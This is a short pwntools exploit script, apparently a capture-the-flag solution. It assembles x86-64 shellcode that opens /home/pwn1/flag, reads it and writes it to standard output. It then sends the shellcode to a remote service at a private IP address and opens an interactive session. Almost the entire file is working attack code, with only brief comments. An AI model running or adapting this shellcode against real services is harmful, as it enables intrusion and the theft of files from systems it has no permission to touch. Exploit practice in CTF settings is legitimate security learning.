from pwn import *

context.arch = "amd64"

# fd = open("/home/pwn1/flag",0)
# size = read(fd,buf,0x2a) # read twice
# write(1,buf,size)
# exit
shellcode = """
open:
    mov rax, 0x6c662f316e
    push rax
    mov DWORD PTR [rsp+5], 0x6761
    mov rax, 0x77702f656d6f682f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x2
    syscall
read:
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x2a
    xor rax, rax
    syscall
    xor rax, rax
    syscall
write:
    mov rdi, 0x1
    mov rax, 0x1
    syscall
"""

r = remote('10.13.2.43', 10739)
r.recvuntil(':')
r.send(asm(shellcode))
r.interactive()
